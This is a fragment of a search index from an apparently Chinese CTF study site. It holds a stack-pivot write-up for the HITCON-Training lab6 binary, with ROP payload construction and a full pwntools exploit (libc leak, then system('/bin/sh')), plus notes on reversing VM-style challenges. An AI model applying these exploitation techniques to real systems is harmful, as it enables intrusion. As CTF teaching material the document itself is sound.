\u8fd9\u4e00\u6b65\u4e0d\u9700\u8981\u518d\u6808\u8fc1\u79fb\uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u518d\u4f2a\u9020 ebp \uff0c\u7528 0x8 \u6570\u636e\u586b\u5145\u5360\u4f4d\u5373\u53ef\u3002\u6700\u7ec8\u76ee\u7684\u662f\u6267\u884c system('/bin/sh') \uff0csystem \u5730\u5740\u53ef\u4ee5\u901a\u8fc7\u67e5\u8be2 libc \u540e\u52a0\u4e0a\u504f\u79fb\u5f97\u5230\uff0c/bin/sh \u83b7\u53d6\u6709\u591a\u79cd\u65b9\u6cd5\u3002\u53ef\u4ee5\u5728 libc \u67e5\uff0c\u53ef\u4ee5\u518d\u6b21\u8c03\u7528 read \u8f93\u5165\u3002 payload 2 \u6784\u9020\u5982\u4e0b\uff1a payload = p32 ( 0x11111111 ) #ebp\u5360\u4f4d payload += p32 ( read_plt ) payload += p32 ( pop_ret ) #\u8fd4\u56de payload += p32 ( 0 ) + p32 ( stack_1 ) + p32 ( 0x100 ) #\u4f20\u53c2\uff0c\u5c06/bin/sh\u5b58\u50a8\u5728stack1 payload += p32 ( system_addr ) payload += p32 ( 0x22222222 ) #system\u538b\u6808\u8fd4\u56de\u5730\u5740\uff0c\u5783\u573e\u586b\u5145\u5373\u53ef payload += p32 ( stack_1 ) #/bin/sh\\0 \u5730\u5740 \u6808\u7a7a\u95f4\u56fe \u7528 read \u4ece stack esp \u5199\u5165\u7684\u65f6\u5019\uff0c\u5404\u4e2a\u6307\u4ee4\u987a\u5e8f\u4e0e\u8ba1\u7b97\u673a\u5199\u5165\u65b9\u5f0f\u6709\u5173\u3002\u5047\u5982 read 0x10 \u6570\u636e\uff0c\u4f1a\u4ece\u8f93\u5165\u5730\u5740\u5411\u9ad8\u5730\u5740\u5199\u5165 0x10 \u7a7a\u95f4\u3002\u5199\u5165\u4e00\u822c\u4e3a\u5c0f\u7aef\u5e8f\uff0c\u7b80\u5355\u70b9\u5c31\u662f\u5199\u5728\u524d\u9762\u7684\uff0c\u5b58\u5728\u540e\u9762\u3002\u8f93\u5165 ABCD \uff0c\u5f55\u5165 0x64636261 \u3002\u6240\u4ee5 read \u4e2d\u586b\u5165\u547d\u4ee4\u8d8a\u524d\u5730\u5740\u8d8a\u9ad8\u8d8a\u5148\u88ab\u6267\u884c \u5b8c\u6574exp #!/usr/bin/env python from pwn import * context . log_level = \"debug\" p = process ( './migration' ) lib = ELF ( '/lib/i386-linux-gnu/libc.so.6' ) elf = ELF ( './migration' ) read_plt = elf . symbols [ 'read' ] puts_plt = elf . symbols [ 'puts' ] puts_got = elf . got [ 'puts' ] read_got = elf . got [ 'read' ] buf = elf . bss () + 0x500 buf2 = elf . bss () + 0x400 pop1ret = 0x804836d pop3ret = 0x8048569 leave_ret = 0x08048418 puts_lib = lib . symbols [ 'puts' ] system_lib = lib . symbols [ 'system' ] p . recv () log . info ( \"*********************change stack_space*********************\" ) junk = 'a' * 0x28 payload = junk + p32 ( buf ) + p32 ( read_plt ) + p32 ( leave_ret ) + p32 ( 0 ) + p32 ( buf ) + p32 ( 0x100 ) p . send ( payload ) log . info ( \"*********************leak libc memory address*********************\" ) payload1 = p32 ( buf2 ) + p32 ( puts_plt ) + p32 ( pop1ret ) + p32 ( puts_got ) + p32 ( read_plt ) + p32 ( leave_ret ) payload1 += p32 ( 0 ) + p32 ( buf2 ) + p32 ( 0x100 ) p . send ( payload1 ) puts_add = u32 ( p . recv ( 4 )) lib_base = puts_add - puts_lib print \"libc base address-->[ %s ]\" % hex ( lib_base ) system_add = lib_base + system_lib print \"system address -->[ %s ]\" % hex ( system_add ) log . info ( \"*********************write binsh*********************\" ) payload3 = p32 ( buf ) + p32 ( read_plt ) + p32 ( pop3ret ) + p32 ( 0 ) + p32 ( buf ) + p32 ( 0x100 ) + p32 ( system_add ) + 'bbbb' + p32 ( buf ) p . send ( payload3 ) p . send ( \"/bin/sh \\0 \" ) p . interactive ()","title":"\u6808\u8fc1\u79fb\u5b66\u4e60\u9644\u4f8b\u9898"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB_O/#_1","text":"","title":"\u6808\u8fc1\u79fb\u5b66\u4e60\u9644\u4f8b\u9898"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB_O/#_2","text":"\u6808\u8fc1\u79fb\u53ef\u4ee5\u89e3\u51b3\u6808\u6ea2\u51fa\u540e\uff0c\u6ca1\u6709\u8db3\u591f\u7a7a\u95f4\u5199\u5165 payload \u7684\u60c5\u51b5\u3002\u4e3b\u8981\u901a\u8fc7 \u4f2a\u9020 ebp \uff0c\u5e76\u5229\u7528 leave|ret gadget \u52ab\u6301\u6808\u5230\u9884\u8bbe\u4f4d\u7f6e\u3002 leave | ret == mov ebp,esp;pop ebp;ret","title":"\u4ecb\u7ecd"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB_O/#hitcon-training-master-lab6","text":"","title":"HITCON-Training-master lab6"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB_O/#_3","text":"\u7a0b\u5e8f\u4e3a32 \u4f4d\u6253\u5f00 NX \u9632\u62a4\uff1a \u8fd0\u884c\u7a0b\u5e8f\uff0c\u63d0\u793a\u8f93\u5165\uff0c\u8f93\u5165\u540e\u9000\u51fa\u7a0b\u5e8f\uff1a main \u51fd\u6570 read \u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u53ef\u6ea2\u51fa\u957f\u5ea6\u4e3a 0x40 - 0x28 \uff1a int __cdecl main ( int argc , const char ** argv , const char ** envp ) { char buf ; // [ esp + 0 h ] [ ebp - 28 h ] if ( count != 0x539 ) exit ( 1 ); ++ count ; setvbuf ( _bss_start , 0 , 2 , 0 ); puts ( \"Try your best :\" ); return read ( 0 , & buf , 0x40 u ); // \u6808\u6ea2\u51fa } \u5728\u53ef\u4ee5\u6ea2\u51fa\u64cd\u4f5c\u7684\u7a7a\u95f4\u5f88\u5c0f\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u6808\u8fc1\u79fb\uff0c\u5f53\u7136\u4f60\u80fd\u627e\u5230\u8d85\u77ed\u7684 shellcode \u4e5f\u53ef\u4ee5\u3002\u80fd\u4e0d\u80fd\u8fdb\u884c ROP \uff0cemmm \u9700\u8981\u4fee\u6539 count \u9632\u6b62\u9000\u51fa\u7a0b\u5e8f\u3002\u90a3\u5c31\u7528\u6808\u8fc1\u79fb\u5427\u3002","title":"\u9898\u76ee\u4ecb\u7ecd"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB_O/#_4","text":"\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6ea2\u51fa eip \u8c03\u7528 read \u5728\u52ab\u6301\u524d\uff0c\u5199\u5165\u4f2a\u9020\u6808\u7a7a\u95f4\u5185\u5bb9\uff08\u6267\u884c\u4ec0\u4e48\u547d\u4ee4\u3001\u6709\u4ec0\u4e48\u53d8\u91cf\u3001\u4f2a\u9020\u6808\u7684ebp\u7b49\uff09 \u4f2a\u9020 ebp \u52ab\u6301\u5f53\u524d\u6808\u5230\u53e6\u5916\u4e00\u4e2a\u5730\u65b9 stack 1 \uff1b\u7136\u540e\u5728 stack 1 \u6cc4\u9732\u51fa libc \u57fa\u5730\u5740\uff0c\u5e76\u518d\u6b21\u4f2a\u9020 ebp \u52ab\u6301\u5f53\u524d\u6808\u5230\u53e6\u5916\u4e00\u4e2a\u5730\u65b9 stack 2\uff1b\u8c03\u7528 system('/bin/sh') \u3002 \u7b2c\u4e00\u6b65 \u6211\u9009\u62e9\u5c06\u5f53\u524d\u6808 stack 0 \uff0c\u52ab\u6301\u5230\u5185\u5b58\u5730\u5740\u4e3a bss+0x200 \u7684stack 1\u3002\u4e3a\u4ec0\u4e48\u662f bss+0x200 \uff1f\u4e00\u5f00\u59cb\u52ab\u6301\u5230 bss \u62a5\u9519\uff0c\u7136\u540e\u5c31\u9009\u62e9\u9ad8\u70b9\u7684\u5730\u5740\u5c31\u6210\u529f\u4e86\u3002 \u6211\u4eec\u8fc1\u79fb\u6808\u4e4b\u540e\uff0c\u6808\u603b\u4e0d\u80fd\u662f\u7a7a\u7684\uff0c\u4ec0\u4e48\u90fd\u4e0d\u6267\u884c\u5c31\u9000\u51fa\u4e86\uff0c\u6240\u4ee5\u5728\u8fd9\u4e00\u6b65\u9700\u8981\u63a7\u5236 stack 0 \u7684 eip \u8c03\u7528 read \uff0c\u5199\u5165 stack 1 \u7684\u6808\u6570\u636e\u3002 \u5927\u81f4\u5229\u7528\u601d\u8def\u91cc\u8bf4\u4e86\uff0c\u9700\u8981\u7b2c\u4e8c\u6b21\u8fc1\u79fb\u6808\uff0c\u6240\u4ee5\u6211\u4eec\u4e5f\u9700\u8981\u4f2a\u9020 stack 1 \uff0c\u4ee5\u5b9e\u73b0\u5728\u5c06 stack 1 \u52ab\u6301\u5230 stack 2 \u3002 payload 0 \u6784\u9020\u5982\u4e0b\uff1a payload = 'a' * 0x28 #\u586b\u5145 payload += stack_1 #\u4f2a\u9020ebp payload += read_plt #\u8c03\u7528read payload += leave_ret #\u5229\u7528gadget\u5c06ebp\u8d4b\u503cesp\u5b8c\u6210\u6808\u8fc1\u79fb payload += p32 ( 0 ) + p32 ( stack_1 ) + p32 ( 0x100 ) #read\u4f20\u53c2 \u6ce8\u610f\uff1a\u8f93\u5165 payload 0 \u4f9d\u7136\u5728 stack 0 \uff0c\u505c\u5728 read \u7b49\u5f85\u8f93\u5165\u72b6\u6001\u3002\u6211\u4eec\u8f93\u5165 payload 1 \u540e\u624d\u6808\u8fc1\u79fb\u5230 stack 1 \u3002 \u7b2c\u4e8c\u6b65 \u5728\u8fd9\u4e00\u6b65\u9700\u8981\u6cc4\u9732 libc \u57fa\u5730\u5740\uff0c\u8c03\u7528\u4e00\u4e2a\u6709\u8f93\u51fa\u529f\u80fd\u7684\u51fd\u6570\uff0c\u628a\u67d0\u4e00\u4e2a\u51fd\u6570\u7684\u771f\u5b9e\u5730\u5740\u8f93\u51fa\u51fa\u6765\uff0c\u7136\u540e\u8ba1\u7b97 libc \u7684\u504f\u79fb\u3002 \u8fd9\u4e00\u6b65\u8fd8\u9700\u8981\u8fdb\u884c\u4e00\u6b21\u6808\u8fc1\u79fb\uff0c\u4f2a\u9020\u7684 ebp \u5df2\u7ecf\u5728\u8fc1\u79fb\u8fdb\u5165 stack 1 \u524d\uff0c\u5df2\u7ecf\u5728stack 0 \u901a\u8fc7 read \u5199\u5165\u5230 stack 1 \u7684 ebp \u4f4d\u7f6e\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8c03\u7528 leave|ret gadget \u5c31\u53ef\u4ee5\u8fdb\u884c\u6808\u8fc1\u79fb\u3002 \u65e2\u7136\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u5c31\u8fd8\u662f\u9700\u8981\u63d0\u524d\u5199\u5165 stack 3 \u7684\u6570\u636e\uff0c\u5c31\u9700\u8981\u518d\u6b21\u8c03\u7528 read \u3002payload 1 \u5148\u63d0\u4f9b\u4e00\u4e2a\u7528\u4e8e\u5199\u5165stack 2 \u7684 read \u51fd\u6570\u5165\u53e3\uff0c\u81f3\u4e8e payload 2 \u5728\u7b2c\u4e09\u6b65\u5206\u6790\u3002 payload 1 \u6784\u9020\u5982\u4e0b\uff1a payload = p32 ( stack_2 ) #\u4f2a\u9020ebp payload += p32 ( puts_plt ) #\u8c03\u7528\u8f93\u51fa\u51fd\u6570 payload += p32 ( pop_ret ) #\u8fd4\u56de payload += p32 ( puts_got ) #\u51fd\u6570\u771f\u5b9e\u5730\u5740 payload += p32 ( read_plt ) payload += p32 ( leave_ret ) #\u5229\u7528gadget\u5c06ebp\u8d4b\u503cesp\u5b8c\u6210\u6808\u8fc1\u79fb payload += p32 ( 0 ) + p32 ( stack_2 ) + p32 ( 0x100 ) #read\u4f20\u53c2 \u7b2c\u4e09\u6b65 \u8fd9\u4e00\u6b65\u4e0d\u9700\u8981\u518d\u6808\u8fc1\u79fb\uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u518d\u4f2a\u9020 ebp \uff0c\u7528 0x8 \u6570\u636e\u586b\u5145\u5360\u4f4d\u5373\u53ef\u3002\u6700\u7ec8\u76ee\u7684\u662f\u6267\u884c system('/bin/sh') \uff0csystem \u5730\u5740\u53ef\u4ee5\u901a\u8fc7\u67e5\u8be2 libc \u540e\u52a0\u4e0a\u504f\u79fb\u5f97\u5230\uff0c/bin/sh \u83b7\u53d6\u6709\u591a\u79cd\u65b9\u6cd5\u3002\u53ef\u4ee5\u5728 libc \u67e5\uff0c\u53ef\u4ee5\u518d\u6b21\u8c03\u7528 read \u8f93\u5165\u3002 payload 2 \u6784\u9020\u5982\u4e0b\uff1a payload = p32 ( 0x11111111 ) #ebp\u5360\u4f4d payload += p32 ( read_plt ) payload += p32 ( pop_ret ) #\u8fd4\u56de payload += p32 ( 0 ) + p32 ( stack_1 ) + p32 ( 0x100 ) #\u4f20\u53c2\uff0c\u5c06/bin/sh\u5b58\u50a8\u5728stack1 payload += p32 ( system_addr ) payload += p32 ( 0x22222222 ) #system\u538b\u6808\u8fd4\u56de\u5730\u5740\uff0c\u5783\u573e\u586b\u5145\u5373\u53ef payload += p32 ( stack_1 ) #/bin/sh\\0 \u5730\u5740 \u6808\u7a7a\u95f4\u56fe \u7528 read \u4ece stack esp \u5199\u5165\u7684\u65f6\u5019\uff0c\u5404\u4e2a\u6307\u4ee4\u987a\u5e8f\u4e0e\u8ba1\u7b97\u673a\u5199\u5165\u65b9\u5f0f\u6709\u5173\u3002\u5047\u5982 read 0x10 \u6570\u636e\uff0c\u4f1a\u4ece\u8f93\u5165\u5730\u5740\u5411\u9ad8\u5730\u5740\u5199\u5165 0x10 \u7a7a\u95f4\u3002\u5199\u5165\u4e00\u822c\u4e3a\u5c0f\u7aef\u5e8f\uff0c\u7b80\u5355\u70b9\u5c31\u662f\u5199\u5728\u524d\u9762\u7684\uff0c\u5b58\u5728\u540e\u9762\u3002\u8f93\u5165 ABCD \uff0c\u5f55\u5165 0x64636261 \u3002\u6240\u4ee5 read \u4e2d\u586b\u5165\u547d\u4ee4\u8d8a\u524d\u5730\u5740\u8d8a\u9ad8\u8d8a\u5148\u88ab\u6267\u884c \u5b8c\u6574exp #!/usr/bin/env python from pwn import * context . log_level = \"debug\" p = process ( './migration' ) lib = ELF ( '/lib/i386-linux-gnu/libc.so.6' ) elf = ELF ( './migration' ) read_plt = elf . symbols [ 'read' ] puts_plt = elf . symbols [ 'puts' ] puts_got = elf . got [ 'puts' ] read_got = elf . got [ 'read' ] buf = elf . bss () + 0x500 buf2 = elf . bss () + 0x400 pop1ret = 0x804836d pop3ret = 0x8048569 leave_ret = 0x08048418 puts_lib = lib . symbols [ 'puts' ] system_lib = lib . symbols [ 'system' ] p . recv () log . info ( \"*********************change stack_space*********************\" ) junk = 'a' * 0x28 payload = junk + p32 ( buf ) + p32 ( read_plt ) + p32 ( leave_ret ) + p32 ( 0 ) + p32 ( buf ) + p32 ( 0x100 ) p . send ( payload ) log . info ( \"*********************leak libc memory address*********************\" ) payload1 = p32 ( buf2 ) + p32 ( puts_plt ) + p32 ( pop1ret ) + p32 ( puts_got ) + p32 ( read_plt ) + p32 ( leave_ret ) payload1 += p32 ( 0 ) + p32 ( buf2 ) + p32 ( 0x100 ) p . send ( payload1 ) puts_add = u32 ( p . recv ( 4 )) lib_base = puts_add - puts_lib print \"libc base address-->[ %s ]\" % hex ( lib_base ) system_add = lib_base + system_lib print \"system address -->[ %s ]\" % hex ( system_add ) log . info ( \"*********************write binsh*********************\" ) payload3 = p32 ( buf ) + p32 ( read_plt ) + p32 ( pop3ret ) + p32 ( 0 ) + p32 ( buf ) + p32 ( 0x100 ) + p32 ( system_add ) + 'bbbb' + p32 ( buf ) p . send ( payload3 ) p . send ( \"/bin/sh \\0 \" ) p . interactive ()","title":"\u5229\u7528\u601d\u8def"},{"location":"Re/Python%E9%80%86%E5%90%91/","text":"Python\u9006\u5411----Blili","title":"Python\u9006\u5411"},{"location":"Re/VM%E9%80%86%E5%90%91%E4%BE%8B%E9%A2%98--%E5%8D%97%E9%82%AE%E5%B9%B3%E5%8F%B0/VM/","text":"VM\u865a\u62df\u673a \u00b6 \u4ecb\u7ecd \u00b6 VM\u5c31\u662f\u865a\u62df\u673a\uff0c\u7c7b\u5c5e\u4e8eVMware\u4e4b\u7c7b\u7684\u3002\u800c\u865a\u62df\u673a\u662f\u5728\u7a0b\u5e8f\u4e2d\u7528\u4ee3\u7801\u6765\u5b9e\u73b0\u7684\u4e00\u4e2a\u865a\u62df\u7cfb\u7edf\uff0c\u7528\u8fd9\u4e2a\u865a\u62df\u7cfb\u7edf\u6765\u89e3\u91ca\u4e00\u4e32**\u5b57\u8282\u7801**\u3002 \u901a\u4fd7\u7684\u6765\u8bf4\uff0cVM\u5c31\u662f\u81ea\u5df1\u8bbe\u8ba1\u4e00\u5957\u7684\u6307\u4ee4\u96c6\u548c\u89e3\u6790\u6307\u4ee4\u96c6\u7684\u89e3\u91ca\u5668\u3002\u518d\u7b80\u5355\u4e00\u70b9\u5c31\u662f\u81ea\u5df1\u5b9e\u73b0\u4e00\u5957\u6c47\u7f16\u8bed\u8a00\u3002 VM\u8bbe\u8ba1\u7684\u4e3b\u8981\u662f\u7684C\u8bed\u8a00\u89e3\u91ca\u5668\uff0c \u624b\u628a\u624b\u6559C\u8bed\u8a00\u7f16\u8bd1\u5668\u865a\u62df\u5668\u8bbe\u8ba1 \u3002 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u5bf9\u6574\u4e2a\u865a\u62df\u89e3\u91ca\u5668\u7ed3\u6784\u8fdb\u884c\u9006\u5411\uff0c\u627e\u51fa\u5176\u4e2d\u5b9a\u4e49\u4e86\u4ec0\u4e48\u51fd\u6570\uff0c\u529f\u80fd\u7b49\u7b49\uff0c\u8fd8\u9700\u8981\u7ed3\u5408\u63d0\u4f9b\u7684\u5b57\u8282\u7801\u8fdb\u884c\u5206\u6790\u3002 \u5b57\u8282\u7801\uff08Byte-code\uff09\u662f\u4e00\u79cd\u5305\u542b\u6267\u884c\u7a0b\u5e8f\uff0c\u7531\u4e00\u5e8f\u5217 op \u4ee3\u7801/\u6570\u636e\u5bf9\u7ec4\u6210\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u662f\u4e00\u79cd\u4e2d\u95f4\u7801\u3002\u88ab\u770b\u4f5c\u662f**\u5305\u542b\u4e00\u4e2a \u6267\u884c\u7a0b\u5e8f \u7684\u4e8c\u8fdb\u5236\u6587\u4ef6**\uff0c\u66f4\u50cf\u4e00\u4e2a\u5bf9\u8c61\u6a21\u578b\u3002\u5b57\u8282\u7801\u88ab\u8fd9\u6837\u53eb\u662f\u56e0\u4e3a\u901a\u5e38\u6bcf\u4e2a opcode \u662f\u4e00\u5b57\u8282\u957f\uff0c\u4f46\u662f\u6307\u4ee4\u7801\u7684\u957f\u5ea6\u662f\u53d8\u5316\u7684\u3002\u6bcf\u4e2a\u6307\u4ee4\u6709\u4ece 0 \u5230 255\uff08\u6216\u5341\u516d\u8fdb\u5236\u7684\uff1a 00 \u5230FF)\u7684\u4e00\u5b57\u8282 \u64cd\u4f5c\u7801 \uff0c\u88ab\u53c2\u6570\u4f8b\u5982\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5730\u5740\u8ddf\u968f\u3002 \u9898\u76ee\u7c7b\u578b \u00b6 VM\u7c7b\u9898\u76ee\u73b0\u5728\u4e3b\u6d41\u662fPwn\u9898\uff0c\u4f46\u4e5f\u6709\u5728\u9006\u5411\u7684\u9898\u76ee\uff0c\u5c11\u90e8\u5206\u4e5f\u6709\u5728\u6742\u9879\u3002 \u867d\u7136\u662f\u6709\u51e0\u4e2a\u65b9\u5411\uff0c\u4f46\u662f\u57fa\u672c\u5f52\u7ed3\u8d77\u6765\u662f\u4e24\u7c7b\uff1a \u7ed9\u51fa\u53ef\u6267\u884c\u7a0b\u5e8f\u548c\u5b57\u8282\u7801\uff0c\u9006\u5411\u865a\u62df\u5f15\u64ce\uff08\u5b9a\u4e49\u7684\u51fd\u6570\uff0c\u8fdb\u884c\u7684\u64cd\u4f5c\uff09\uff0c\u7ed3\u5408\u9898\u76ee\u63d0\u4f9b\u7684\u5b57\u8282\u7801\uff0c\u63a8\u51fa\u6765flag \u53ea\u7ed9\u51fa\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u9006\u5411\u865a\u62df\u5f15\u64ce\uff08\u5b9a\u4e49\u7684\u51fd\u6570\uff0c\u8fdb\u884c\u7684\u64cd\u4f5c\uff09\uff0c\u6784\u9020\u5b57\u8282\u7801\uff0c\u8bfb\u53d6flag \u505a\u9898\u6280\u5de7 \u00b6 \u6765\u81ea \u4e00\u7b50\u841d\u535c \u5f53\u5728\u6253CTF\u62ff\u5230\u4e00\u4e2aVM\u9898\u7684\u65f6\u5019\uff0c\u601d\u8def\u4e00\u5b9a\u6e05\u6670\uff0c\u4e0d\u80fd\u76f2\u76ee\u7684\u53bb\u5206\u6790\uff1b \u5206\u6790\u865a\u62df\u673a\u5165\u53e3\uff0c\u627e\u51fa\u6765\u9898\u76ee\u63d0\u4f9b\u7684\u5b57\u8282\u7801 \u7406\u6e05\u865a\u62df\u673a\u7684\u7ed3\u6784\uff0c\u9006\u5411\u5904\u5404\u4e2ahandler\u7684\u610f\u601d \u6839\u636e\u5404\u4e2ahandler\u6765\u5c06\u5b57\u8282\u7801\u8fd8\u539f\u6210\u6c47\u7f16\u4ee3\u7801 \u6839\u636e\u6c47\u7f16\u4ee3\u7801\u63a8\u51faflag \u5982\u679c\u52a8\u6001\u8c03\u8bd5\u5206\u6790\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u5f88\u590d\u6742\uff0c\u8df3\u6765\u8df3\u53bb\u7684\uff0c\u6240\u4ee5\u5efa\u8bae\u5148\u7528IDA\u6765\u9759\u6001\u5206\u6790\u3002 \ud83c\udf30\u4f8b\u5b50 \u00b6 \u7ea2\u5e3d\u676fRHVM \u00b6 \u521d\u59cb\u5316\u51fd\u6570\u6253\u5f00\u4e86 flag \u6587\u4ef6\uff0c\u5e76\u4f7f\u7528 dup2 \u5c06 \u6587\u4ef6\u63cf\u8ff0\u7b26 \u91cd\u5b9a\u5411\u5230 563 \u3002 fd = open ( \"/flag\" , 0 ); if ( fd == -1 ) { puts ( \"What?\" ); exit ( -1 ); } dup2 ( fd , 563 ); \u5728\u6267\u884c\u5b8c main \u51fd\u6570\u540e\u4f1a\u8df3\u8f6c\u5230\u8fd9\u91cc\u3002\u5982\u679c\u5c06stdin\u7684fileno\u4fee\u6539\u4e3a563\uff0c\u90a3\u4e48\u8fd9\u91ccscanf\u4f1a\u8bfb\u53d6\u5230flag\uff0c\u7136\u540e\u5728\u4e0b\u4e00\u884c\u7684printf\u8f93\u51faflag\u3002 printf ( \"Could you tell me your name?\" ); __isoc99_scanf ( \"%99s\" , & v0 ); printf ( \"Goodbye~ %s \\n \" , & v0 ); puts ( \"See you next time.\" ); exit ( 0 ); \u627e\u5230VM\u5b9a\u4e49\u7684\u5165\u53e3\uff0c\u9006\u5411\u51fa\u865a\u62df\u5f15\u64ce\u3002\u627e\u5230\u5f15\u64ce\u4e2d\u5b9a\u4e49\u7684 MovDataToReg \u548c MovRegToData \u53ef\u4ee5\u8d8a\u754c\u8bfb\u53d6Data\u6bb5\u3002 \u5177\u4f53WP\uff0c \u770b\u8fd9\u91cc \u3002 \u7ea2\u5e3d\u676fPVP GAME \u00b6 \u7a0b\u5e8f\u8bfb\u53d6\u8f93\u5165\u540e\uff0c\u5bf9\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8fdb\u884cbase64\u89e3\u7801 _BYTE * __fastcall Base64Decode ( const char * src ) { int v2 ; // [rsp+10h] [rbp-220h] int v3 ; // [rsp+14h] [rbp-21Ch] signed __int64 OrignLen ; // [rsp+18h] [rbp-218h] signed __int64 len ; // [rsp+20h] [rbp-210h] _BYTE * dest ; // [rsp+28h] [rbp-208h] int v7 [ 126 ]; // [rsp+30h] [rbp-200h] unsigned __int64 v8 ; // [rsp+228h] [rbp-8h] qmemcpy ( v7 , & unk_1B60 , 0x1ECuLL ); len = strlen ( src ); if ( strstr ( src , \"==\" ) ) // base64 { OrignLen = 3 * ( len / 4 ) - 2 ; } else if ( strchr ( src , '=' ) ) { OrignLen = 3 * ( len / 4 ) - 1 ; } else { OrignLen = 3 * ( len / 4 ); } dest = calloc ( 1uLL , OrignLen + 1 ); dest [ OrignLen ] = 0 ; v2 = 0 ; v3 = 0 ; while ( v2 < len - 2 ) { dest [ v3 ] = (( unsigned __int8 ) v7 [( unsigned __int8 ) src [ v2 + 1 ]] >> 4 ) | 4 * v7 [( unsigned __int8 ) src [ v2 ]]; dest [ v3 + 1 ] = (( unsigned __int8 ) v7 [( unsigned __int8 ) src [ v2 + 2 ]] >> 2 ) | 16 * v7 [( unsigned __int8 ) src [ v2 + 1 ]]; dest [ v3 + 2 ] = LOBYTE ( v7 [( unsigned __int8 ) src [ v2 + 3 ]]) | (( unsigned __int8 ) v7 [( unsigned __int8 ) src [ v2 + 2 ]] << 6 ); v3 += 3 ; v2 += 4 ; } return dest ; } \u7136\u540e\u8fd0\u884cdefence\u6587\u4ef6\u63d0\u4f9b\u7684\u5b57\u8282\u7801\u6765\u5bf9\u8f93\u5165\u7684code\u8fdb\u884c\u68c0\u67e5\u3002\u6700\u540e\u8fd0\u884c\u8f93\u5165\u7684\u5b57\u8282\u7801\u3002 for ( j = 0 ; j <= 15 ; ++ j ) RunOpcode ( Defence , a2 , 24L L * j , a4 , a5 , a6 , Code [ j ]. opcode , Code [ j ]. arg1 , Code [ j ]. arg2 ); return puts ( \"Game Over!\" ); \u8f93\u5165\u7684\u5b57\u8282\u7801\u662f\u538b\u5165\u6570\u636e\u548c\u6267\u884c\u51fd\u6570\u3002\u56e0\u4e3a\u7a0b\u5e8f\u5f00\u59cb\u5c31\u7ed9\u51fa\u4e86 libc \u7684\u5730\u5740\uff0c\u6240\u4ee5\u5c31\u89e3\u9898\u7684\u5173\u952e\u5c31\u662f\u9006\u5411\u51fa\u865a\u62df\u5f15\u64ce\u7684\u5185\u5bb9\u3002 \u5177\u4f53WP\uff0c \u770b\u8fd9\u91cc \u3002 \u5357\u90aeWxyVM1 \u00b6 \u4ece main \u51fd\u6570\u770b\uff0c\u5c31\u662f\u5c06 input \u52a0\u5bc6\u540e\u4e0e \u771f\u00b7flag \u7684\u52a0\u5bc6\u503c\u5bf9\u6bd4\uff0c\u76f8\u540c\u7684\u8f93\u51fa correct \u3002 __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { char v4 ; // [rsp+Bh] [rbp-5h] signed int i ; // [rsp+Ch] [rbp-4h] puts ( \"[WxyVM 0.0.1]\" ); puts ( \"input your flag:\" ); scanf ( \"%s\" , & input ); v4 = 1 ; vm_start (); //input\u52a0\u5bc6\u51fd\u6570 if ( strlen ( & input ) != 24 ) v4 = 0 ; for ( i = 0 ; i <= 23 ; ++ i ) { if ( * ( & input + i ) != enc [ i ] ) v4 = 0 ; } if ( v4 ) puts ( \"correct\" ); else puts ( \"wrong\" ); return 0L L ; } \u4e5f\u5c31\u662f\u8bf4\u5c06 vm_start \u7684\u52a0\u5bc6\u539f\u7406\u641e\u51fa\u6765\u5c31\u597d\u4e86\u3002\u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 byte_6010C0 \u8fd9\u4e2a\u6570\u7ec4\u768415000\u4e2a\u5143\u7d20\uff0c\u5176\u4e2d\u6bcf\u4e09\u4e2a\u4e3a\u4e00\u7ec4\u53c2\u52a0\u4e00\u6b21\u5faa\u73af\u3002byte_6010C0[i] \u4f5c\u4e3a switch \u7684\u64cd\u4f5c\u6307\u4ee4\uff0cbyte_6010C0[i + 1] \u4f5c\u4e3a input \u7684\u4e0b\u6807\uff0cbyte_6010C0[i + 2] \u4f5c\u4e3a\u8fdb\u884c\u64cd\u4f5c\u7684\u64cd\u4f5c\u6570\u3002 __int64 vm_start () { unsigned int v0 ; // ST04_4 __int64 result ; // rax signed int i ; // [rsp+0h] [rbp-10h] char v3 ; // [rsp+8h] [rbp-8h] for ( i = 0 ; i <= 14999 ; i += 3 ) { v0 = byte_6010C0 [ i ]; v3 = byte_6010C0 [ i + 2 ]; result = v0 ; switch ( v0 ) { case 1u : result = byte_6010C0 [ i + 1 ]; * ( & input + result ) += v3 ; break ; case 2u : result = byte_6010C0 [ i + 1 ]; * ( & input + result ) -= v3 ; break ; case 3u : result = byte_6010C0 [ i + 1 ]; * ( & input + result ) ^= v3 ; break ; case 4u : result = byte_6010C0 [ i + 1 ]; * ( & input + result ) *= v3 ; break ; case 5u : result = byte_6010C0 [ i + 1 ]; * ( & input + result ) ^= * ( & input + byte_6010C0 [ i + 2 ]); break ; default : continue ; } } return result ; } 